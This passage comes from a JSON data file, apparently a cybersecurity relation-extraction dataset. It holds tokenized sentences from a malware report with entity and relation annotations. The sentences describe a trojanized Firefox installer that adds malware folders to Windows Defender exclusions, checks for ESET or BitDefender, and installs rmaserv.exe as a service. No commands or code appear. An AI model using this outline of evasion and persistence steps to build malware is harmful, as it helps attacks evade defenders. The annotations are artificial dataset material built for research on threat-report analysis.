"installer", "Before", "writing", "the", "toolkit", "into", "the", "hard", "drive", ",", "the", "fake", "Firefox", "installer", "executes", "a", "PowerShell", "command", "that", "will", "add", "the", "directories", "used", "by", "the", "malware", "to", "the", "Windows", "Defender", "exclusions", "list", "and", "prevent", "sample", "submission", "at", "the", "same", "time", "."], ["After", "that", ",", "it", "will", "check", "if", "ESET", "or", "BitDefender", "antivirus", "are", "installed", "before", "dropping", "the", "malware", "."], ["The", "setup", "deploys", "three", "files", "which", "are", "part", "of", "the", "toolset", ":", "rmaserv.exe", ",", "winprint32.exe", "and", "mssqldbserv.xml", "."], ["Execution", "flow", "As", "the", "execution", "flow", "shows", ",", "the", "setup", "will", "only", "execute", "rmaserv.exe", "."], ["The", "remaining", "modules", "are", "executed", "by", "rmaserv.exe", "when", "this", "executable", "will", "be", "executed", "as", "a", "service", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [11, 11], "name": "C : \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\", "pos": [11, 18], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [45, 45], "name": "ini.php", "pos": [15, 16], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [47, 47], "name": "info.php", "pos": [17, 18], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [49, 49], "name": "parse_ini_file.php", "pos": [19, 20], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [62, 62], "name": "VPNpro trojanized application", "pos": [1, 4], "index": "4_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [68, 68], "name": "registry key", "pos": [7, 9], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [98, 98], "name": "Firefox installer", "pos": [17, 19], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [102, 102], "name": "PowerShell command", "pos": [21, 23], "index": "7_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [108, 108], "name": "directories", "pos": [27, 28], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [112, 112], "name": "malware", "pos": [31, 32], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [131, 131], "name": "it", "pos": [3, 4], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [135, 135], "name": "ESET", "pos": [7, 8], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [137, 137], "name": "BitDefender", "pos": [9, 10], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [144, 144], "name": "malware", "pos": [16, 17], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [147, 147], "name": "setup", "pos": [1, 2], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [158, 158], "name": "rmaserv.exe", "pos": [12, 13], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [160, 160], "name": "winprint32.exe", "pos": [14, 15], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [162, 162], "name": "mssqldbserv.xml", "pos": [16, 17], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [173, 173], "name": "setup", "pos": [9, 10], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [177, 177], "name": "rmaserv.exe", "pos": [13, 14], "index": "19_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [181, 181], "name": "modules", "pos": [2, 3], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [185, 185], "name": "rmaserv.exe", "pos": [6, 7], "index": "21_0"}]], "labels": [{"r": "RD", "evidence": [2], "h": 4, "t": 5}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "RD", "evidence": [3], "h": 6, "t": 8}, {"r": "EX", "evidence": [3], "h": 6, "t": 7}, {"r": "WR", "evidence": [3], "h": 6, "t": 8}, {"r": "RD", "evidence": [3], "t": 8, "h": 9}, {"r": "CO", "evidence": [3, 4], "h": 9, "t": 10}, {"r": "RD", "evidence": [4], "h": 10, "t": 11}, {"r": "RD", "evidence": [4], "h": 10, "t": 12}, {"r": "FR", "evidence": [4], "h": 10, "t": 13}, {"r": "FR", "evidence": [5], "h": 14, "t": 15}, {"r": "FR", "evidence": [5], "h": 14, "t": 16}, {"r": "FR", "evidence": [5], "h": 14, "t": 17}, {"r": "CO", "evidence": [5, 6], "h": 14, "t": 18}, {"r": "EX", "evidence": [6], "h": 18, "t": 19}, {"r": "EX", "evidence": [6, 7], "t": 19, "h": 21}, {"r": "EX", "evidence": [7], "t": 20, "h": 21}]}, {"title": "641-11", "sents": [["The", "C2", "path", "pattern", "has", "also", "changed", ",", "we", "have", "identified", "the", "following", "paths", ":", "ini.php", ",", "info.php", "and", "parse_ini_file.php", ",", "which", "are", "no", "longer", "random", "nor", "animal", "named", "based", "."], ["The", "VPNpro", "trojanized", "application", "uses", "an", "AutoRun", "registry", "key", ",", "as", "mentioned", "in", "the", "publication", "released", "before", "July", "2019", "."], ["Anti-virus", "checks", "on", "Firefox", "trojanized", "installer", "Before", "writing", "the", "toolkit", "into", "the", "hard", "drive", ",", "the", "fake", "Firefox", "installer", "executes", "a", "PowerShell", "command", "that", "will", "add", "the", "directories", "used", "by", "the", "malware", "to", "the", "Windows", "Defender", "exclusions", "list", "and", "prevent", "sample", "submission", "at", "the", "same", "time", "."], ["After", "that", ",", "it", "will", "check", "if", "ESET", "or", "BitDefender", "antivirus", "are", "installed", "before", "dropping", "the", "malware", "."], ["The", "setup", "deploys", "three", "files", "which", "are", "part", "of", "the", "toolset", ":", "rmaserv.exe", ",", "winprint32.exe", "and", "mssqldbserv.xml", "."], ["Execution", "flow", "As", "the", "execution", "flow", "shows", ",", "the", "setup", "will", "only", "execute", "rmaserv.exe", "."], ["The", "remaining", "modules", "are", "executed", "by", "rmaserv.exe", "when", "this", "executable", "will", "be", "executed", "as", "a", "service", "."], ["The", "malicious", "service", ":", "rmaserv.exe", "This", "binary", "has", "two", "main", "features", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "ini.php", "pos": [15, 16], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [17, 17], "name": "info.php", "pos": [17, 18], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [19, 19], "name": "parse_ini_file.php", "pos": [19, 20], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [32, 32], "name": "VPNpro trojanized application", "pos": [1, 4], "index": "3_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [38, 38], "name": "registry key", "pos": [7, 9], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [68, 68], "name": "Firefox installer", "pos": [17, 19], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [72, 72], "name": "PowerShell command", "pos": [21, 23], "index": "6_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [78, 78], "name": "directories", "pos": [27, 28], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [82, 82], "name": "malware", "pos": [31, 32], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [101, 101], "name": "it", "pos": [3, 4], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [105, 105], "name": "ESET", "pos": [7, 8], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [107, 107], "name": "BitDefender", "pos": [9, 10], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [114, 114], "name": "malware", "pos": [16, 17], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [117, 117], "name": "setup", "pos": [1, 2], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [128, 128], "name": "rmaserv.exe", "pos": [12, 13], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [130, 130], "name": "winprint32.exe", "pos": [14, 15], "index": "15_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [132, 132], "name": "mssqldbserv.xml", "pos": [16, 17], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [143, 143], "name": "setup", "pos": [9, 10], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [147, 147], "name": "rmaserv.exe", "pos": [13, 14], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [151, 151], "name": "modules", "pos": [2, 3], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [155, 155], "name": "rmaserv.exe", "pos": [6, 7], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [170, 170], "name": "rmaserv.exe", "pos": [4, 5], "index": "21_0"}]], "labels": [{"r": "RD", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "RD", "evidence": [2], "h": 5, "t": 7}, {"r": "EX", "evidence": [2], "h": 5, "t": 6}, {"r": "WR", "evidence": [2], "h": 5, "t": 7}, {"r": "RD", "evidence": [2], "t": 7, "h": 8}, {"r": "CO", "evidence": [2, 3], "h": 8, "t": 9}, {"r": "RD", "evidence": [3], "h": 9, "t": 10}, {"r": "RD", "evidence": [3], "h": 9, "t": 11}, {"r": "FR", "evidence": [3], "h": 9, "t": 12}, {"r": "FR", "evidence": [4], "h": 13, "t": 14}, {"r": "FR", "evidence": [4], "h": 13, "t": 15}, {"r": "FR", "evidence": [4], "h": 13, "t": 16}, {"r": "CO", "evidence": [4, 5], "h": 13, "t": 17}, {"r": "EX", "evidence": [5], "h": 17, "t": 18}, {"r": "EX", "evidence": [5, 6], "t": 18, "h": 20}, {"r": "EX", "evidence": [6], "t": 19, "h": 20}, {"r": "CO", "evidence": [6, 7], "h": 20, "t": 21}]}, {"title": "641-12", "sents": [["The", "VPNpro", "trojanized", "application", "uses", "an", "AutoRun", "registry", "key", ",", "as", "mentioned", "in", "the", "publication", "released", "before", "July", "2019", "."], ["Anti-virus", "checks", "on", "Firefox", "trojanized", "installer", "Before", "writing", "the", "toolkit", "into", "the", "hard", "drive", ",", "the", "fake", "Firefox", "installer", "executes", "a", "PowerShell", "command", "that", "will", "add", "the", "directories", "used", "by", "the", "malware", "to", "the", "Windows", "Defender", "exclusions", "list", "and", "prevent", "sample", "submission", "at", "the", "same", "time", "."], ["After", "that", ",", "it", "will", "check", "if", "ESET", "or", "BitDefender", "antivirus", "are", "installed", "before", "dropping", "the", "malware", "."], ["The", "setup", "deploys", "three", "files", "which", "are", "part", "of", "the", "toolset", ":", "rmaserv.exe", ",", "winprint32.exe", "and", "mssqldbserv.xml", "."], ["Execution", "flow", "As", "the", "execution", "flow", "shows", ",", "the", "setup", "will", "only", "execute", "rmaserv.exe", "."], ["The", "remaining", "modules", "are", "executed", "by", "rmaserv.exe", "when", "this", "executable", "will", "be", "executed", "as", "a", "service", "."], ["The", "malicious", "service", ":", "rmaserv.exe", "This", "binary", "has", "two", "main", "features", "."], ["If", "it", "is", "executed", "with", "the", "``", "help", "''", "parameter", ",", "it", "will", "install", "a", "service", "to", "execute", "itself", "as", "a", "service", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "VPNpro trojanized application", "pos": [1, 4], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [7, 7], "name": "registry key", "pos": [7, 9], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [37, 37], "name": "Firefox installer", "pos": [17, 19], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [41, 41], "name": "PowerShell command", "pos": [21, 23], "index": "3_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [47, 47], "name": "directories", "pos": [27, 28], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [51, 51], "name": "malware", "pos": [31, 32], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [70, 70], "name": "it", "pos": [3, 4], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [74, 74], "name": "ESET", "pos": [7, 8], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [76, 76], "name": "BitDefender", "pos": [9, 10], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [83, 83], "name": "malware", "pos": [16, 17], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [86, 86], "name": "setup", "pos": [1, 2], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [97, 97], "name": "rmaserv.exe", "pos": [12, 13], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [99, 99], "name": "winprint32.exe", "pos": [14, 15], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [101, 101], "name": "mssqldbserv.xml", "pos": [16, 17], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [112, 112], "name": "setup", "pos": [9, 10], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [116, 116], "name": "rmaserv.exe", "pos": [13, 14], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [120, 120], "name": "modules", "pos": [2, 3], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [124, 124], "name": "rmaserv.exe", "pos": [6, 7], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [139, 139], "name": "rmaserv.exe", "pos": [4, 5], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [148, 148], "name": "it", "pos": [1, 2], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [162, 162], "name": "service", "pos": [15, 16], "index": "20_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [1], "h": 2, "t": 4}, {"r": "EX", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1], "h": 2, "t": 4}, {"r": "RD", "evidence": [1], "t": 4, "h": 5}, {"r": "CO", "evidence": [1, 2], "h": 5, "t": 6}, {"r": "RD", "evidence": [2], "h": 6, "t": 7}, {"r": "RD", "evidence": [2], "h": 6, "t": 8}, {"r": "FR", "evidence": [2], "h": 6, "t": 9}, {"r": "FR", "evidence": [3], "h": 10, "t": 11}, {"r": "FR", "evidence": [3], "h": 10, "t": 12}, {"r": "FR", "evidence": [3], "h": 10, "t": 13}, {"r": "CO", "evidence": [3, 4], "h": 10, "t": 14}, {"r": "EX", "evidence": [4], "h": 14, "t": 15}, {"r": "EX", "evidence": [4, 5], "t": 15, "h": 17}, {"r": "EX", "evidence": [5], "t": 16, "h": 17}, {"r": "CO", "evidence": [5, 6], "h": 17, "t": 18}, {"r": "CO", "evidence": [5, 6, 7], "h": 17, "t": 19}, {"r": "FR", "evidence": [7], "h": 19, "t": 20}]}, {"title": "641-13", "sents": [["Anti-virus", "checks", "on", "Firefox", "trojanized", "installer", "Before", "writing", "the", "toolkit", "into", "the", "hard", "drive", ",", "the", "fake", "Firefox", "installer", "executes", "a", "PowerShell", "command", "that", "will", "add", "the", "directories", "used", "by", "the", "malware", "to", "the", "Windows", "Defender", "exclusions", "list", "and", "prevent", "sample", "submission", "at", "the", "same", "time", "."], ["After", "that", ",", "it", "will", "check", "if", "ESET", "or", "BitDefender", "antivirus", "are", "installed", "before", "dropping", "the", "malware", "."], ["The", "setup", "deploys", "three", "files", "which", "are", "part", "of", "the", "toolset", ":", "rmaserv.exe", ",", "winprint32.exe", "and", "mssqldbserv.xml", "."], ["Execution", "flow", "As", "the", "execution", "flow", "shows", ",", "the", "setup", "will", "only", "execute", "rmaserv.exe", "."], ["The", "remaining", "modules", "are", "executed", "by", "rmaserv.exe", "when", "this", "executable", "will", "be", "executed", "as", "a", "service", "."], ["The", "malicious", "service", ":", "rmaserv.exe", "This", "binary", "has", "two", "main", "features", "."], ["If", "it", "is", "executed", "with", "the", "``", "help", "''", "parameter", ",", "it", "will", "install", "a", "service", "to", "execute", "itself", "as", "a", "service", "."], ["This", "parameter", "is", "used", "by", "the", "trojanized", "installer", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [17, 17], "name": "Firefox installer", "pos": [17, 19], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [21, 21], "name": "PowerShell command", "pos": [21, 23], "index": "1_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [27, 27], "name": "directories", "pos": [27, 28], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [31, 31], "name": "malware", "pos": [31, 32], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [50, 50], "name": "it", "pos": [3, 4], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [54, 54], "name": "ESET", "pos": [7, 8], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [56, 56], "name": "BitDefender", "pos": [9, 10], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [63, 63], "name": "malware", "pos": [16, 17], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [66, 66], "name": "setup", "pos": [1, 2], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [77, 77], "name": "rmaserv.exe", "pos": [12, 13], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [79, 79], "name": "winprint32.exe", "pos": [14, 15], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [81, 81], "name": "mssqldbserv.xml", "pos": [16, 17], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [92, 92], "name": "setup", "pos": [9, 10], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [96, 96], "name": "rmaserv.exe", "pos": [13, 14], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [100, 100], "name": "modules", "pos": [2, 3], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [104, 104], "name": "rmaserv.exe", "pos": [6, 7], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [119, 119], "name": "rmaserv.exe", "pos": [4, 5], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [128, 128], "name": "it", "pos": [1, 2], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [142, 142], "name": "service", "pos": [15, 16], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [156, 156], "name": "trojanized installer", "pos": [6, 8], "index": "19_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 2}, {"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [0], "t": 2, "h": 3}, {"r": "CO", "evidence": [0, 1], "h": 3, "t": 4}, {"r": "RD", "evidence": [1], "h": 4, "t": 5}, {"r": "RD", "evidence": [1], "h": 4, "t": 6}, {"r": "FR", "evidence": [1], "h": 4, "t": 7}, {"r": "FR", "evidence": [2], "h": 8, "t": 9}, {"r": "FR", "evidence": [2], "h": 8, "t": 10}, {"r": "FR", "evidence": [2], "h": 8, "t": 11}, {"r": "CO", "evidence": [2, 3], "h": 8, "t": 12}, {"r": "EX", "evidence": [3], "h": 12, "t": 13}, {"r": "EX", "evidence": [3, 4], "t": 13, "h": 15}, {"r": "EX", "evidence": [4], "t": 14, "h": 15}, {"r": "CO", "evidence": [4, 5], "h": 15, "t": 16}, {"r": "CO", "evidence": [4, 5, 6], "h": 15, "t": 17}, {"r": "FR", "evidence": [6], "h": 17, "t": 18}, {"r": "RD", "evidence": [4, 5, 6, 7], "t": 14, "h": 19}]}, {"title": "641-14", "sents": [["After", "that", ",", "it", "will", "check", "if", "ESET", "or", "BitDefender", "antivirus", "are", "installed", "before", "dropping", "the", "malware", "."], ["The", "setup", "deploys", "three", "files", "which", "are", "part", "of", "the", "toolset", ":", "rmaserv.exe", ",", "winprint32.exe", "and", "mssqldbserv.xml", "."], ["Execution", "flow", "As", "the", "execution", "flow", "shows", ",", "the", "setup", "will", "only", "execute", "rmaserv.exe", "."], ["The", "remaining", "modules", "are", "executed", "by", "rmaserv.exe", "when", "this", "executable", "will", "be", "executed", "as", "a", "service", "."], ["The", "malicious", "service", ":", "rmaserv.exe", "This", "binary", "has", "two", "main", "features", "."], ["If", "it", "is", "executed", "with", "the", "``", "help", "''", "parameter", ",", "it", "will", "install", "a", "service", "to", "execute", "itself", "as", "a", "service", "."], ["This", "parameter", "is", "used", "by", "the", "trojanized", "installer", "."], ["Consequently", ",", "the", "execution", "wo", "n't", "do", "anything", "and", "the", "dynamic", "analysis", "will", "be", "skewed", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "it", "pos": [3, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "ESET", "pos": [7, 8], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "BitDefender", "pos": [9, 10], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [16, 16], "name": "malware", "pos": [16, 17], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [19, 19], "name": "setup", "pos": [1, 2], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [30, 30], "name": "rmaserv.exe", "pos": [12, 13], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [32, 32], "name": "winprint32.exe", "pos": [14, 15], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [34, 34], "name": "mssqldbserv.xml", "pos": [16, 17], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [45, 45], "name": "setup", "pos": [9, 10], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [49, 49], "name": "rmaserv.exe", "pos": [13, 14], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [53, 53], "name": "modules", "pos": [2, 3], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [57, 57], "name": "rmaserv.exe", "pos": [6, 7], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [72, 72], "name": "rmaserv.exe", "pos": [4, 5], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [81, 81], "name": "it", "pos": [1, 2], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [95, 95], "name": "service", "pos": [15, 16], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [109, 109], "name": "trojanized installer", "pos": [6, 8], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [115, 115], "name": "execution", "pos": [3, 4], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [122, 122], "name": "dynamic analysis", "pos": [10, 12], "index": "17_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 0, "t": 2}, {"r": "FR", "evidence": [0], "h": 0, "t": 3}, {"r": "FR", "evidence": [1], "h": 4, "t": 5}, {"r": "FR", "evidence": [1], "h": 4, "t": 6}, {"r": "FR", "evidence": [1], "h": 4, "t": 7}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 8}, {"r": "EX", "evidence": [2], "h": 8, "t": 9}, {"r": "EX", "evidence": [2, 3], "t": 9, "h": 11}, {"r": "EX", "evidence": [3], "t": 10, "h": 11}, {"r": "CO", "evidence": [3, 4], "h": 11, "t": 12}, {"r": "CO", "evidence": [3, 4, 5], "h": 11, "t": 13}, {"r": "CO", "evidence": [3, 4, 5, 6, 7], "h": 11, "t": 16}, {"r": "FR", "evidence": [5], "h": 13, "t": 14}, {"r": "RD", "evidence": [3, 4, 5, 6], "t": 10, "h": 15}, {"r": "FR", "evidence": [7], "h": 16, "t": 17}]}, {"title": "641-15", "sents": [["The", "setup", "deploys", "three", "files", "which", "are", "part", "of", "the", "toolset", ":", "rmaserv.exe", ",", "winprint32.exe", "and", "mssqldbserv.xml", "."], ["Execution", "flow", "As", "the", "execution", "flow", "shows", ",", "the", "setup", "will", "only", "execute", "rmaserv.exe", "."], ["The", "remaining", "modules", "are", "executed", "by", "rmaserv.exe", "when", "this", "executable", "will", "be", "executed", "as", "a", "service", "."], ["The", "malicious", "service", ":", "rmaserv.exe", "This", "binary", "has", "two", "main", "features", "."], ["If", "it", "is", "executed", "with", "the", "``", "help", "''", "parameter", ",", "it", "will", "install", "a", "service", "to", "execute", "itself", "as", "a", "service", "."], ["This", "parameter", "is", "used", "by", "the", "trojanized", "installer", "."], ["Consequently", ",", "the", "execution", "wo", "n't", "do", "anything", "and", "the", "dynamic", "analysis", "will", "be", "skewed", "."], ["First", ",", "it", "will", "launch", "the", "winprint32.exe", "executable", "(", "C2", "contact", "module", ")", "and", "then", "it", "will", "wait", "for", "an", "event", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "setup", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [12, 12], "name": "rmaserv.exe", "pos": [12, 13], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [14, 14], "name": "winprint32.exe", "pos": [14, 15], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [16, 16], "name": "mssqldbserv.xml", "pos": [16, 17], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [27, 27], "name": "setup", "pos": [9, 10], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "rmaserv.exe", "pos": [13, 14], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [35, 35], "name": "modules", "pos": [2, 3], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [39, 39], "name": "rmaserv.exe", "pos": [6, 7], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [54, 54], "name": "rmaserv.exe", "pos": [4, 5], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [63, 63], "name": "it", "pos": [1, 2], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [77, 77], "name": "service", "pos": [15, 16], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [91, 91], "name": "trojanized installer", "pos": [6, 8], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [97, 97], "name": "execution", "pos": [3, 4], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [104, 104], "name": "dynamic analysis", "pos": [10, 12], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [112, 112], "name": "it", "pos": [2, 3], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [116, 116], "name": "winprint32.exe", "pos": [6, 7], "index": "15_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "FR", "evidence": [0], "h": 0, "t": 3}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "EX", "evidence": [1], "h": 4, "t": 5}, {"r": "EX", "evidence": [1, 2], "t": 5, "h": 7}, {"r": "EX", "evidence": [2], "t": 6, "h": 7}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 8}, {"r": "CO", "evidence": [2, 3, 4], "h": 7, "t": 9}, {"r": "CO", "evidence": [2, 3, 4, 5, 6], "h": 7, "t": 12}, {"r": "FR", "evidence": [4], "h": 9, "t": 10}, {"r": "RD", "evidence": [2, 3, 4, 5], "t": 6, "h": 11}, {"r": "FR", "evidence": [6], "h": 12, "t": 13}, {"r": "CO", "evidence": [6, 7], "h": 13, "t": 14}, {"r": "FR", "evidence": [7], "h": 14, "t": 15}]}, {"title": "641-16", "sents": [["Execution", "flow", "As", "the", "execution", "flow", "shows", ",", "the", "setup", "will", "only", "execute", "rmaserv.exe", "."], ["The", "remaining", "modules", "are", "executed", "by", "rmaserv.exe", "when", "this", "executable", "will", "be", "executed", "as", "a", "service", "."], ["The", "malicious", "service", ":", "rmaserv.exe", "This", "binary", "has", "two", "main", "features", "."], ["If", "it", "is", "executed", "with", "the", "``", "help", "''", "parameter", ",", "it", "will", "install", "a", "service", "to", "execute", "itself", "as", "a", "service", "."], ["This", "parameter", "is", "used", "by", "the", "trojanized", "installer", "."], ["Consequently", ",", "the", "execution", "wo", "n't", "do", "anything", "and", "the", "dynamic", "analysis", "will", "be", "skewed", "."], ["First", ",", "it", "will", "launch", "the", "winprint32.exe", "executable", "(", "C2", "contact", "module", ")", "and", "then", "it", "will", "wait", "for", "an", "event", "."], ["This", "event", "is", "the", "mechanism", "used", "by", "the", "C2", "contact", "module", "to", "alert", "the", "service", "executable", "to", "perform", "the", "cleaning", "of", "all", "components", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [9, 9], "name": "setup", "pos": [9, 10], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "rmaserv.exe", "pos": [13, 14], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [17, 17], "name": "modules", "pos": [2, 3], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [21, 21], "name": "rmaserv.exe", "pos": [6, 7], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [36, 36], "name": "rmaserv.exe", "pos": [4, 5], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [45, 45], "name": "it", "pos": [1, 2], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [59, 59], "name": "service", "pos": [15, 16], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [73, 73], "name": "trojanized installer", "pos": [6, 8], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [79, 79], "name": "execution", "pos": [3, 4], "index": "8_0"}], [{"type": "MP", "sent_id": 5, 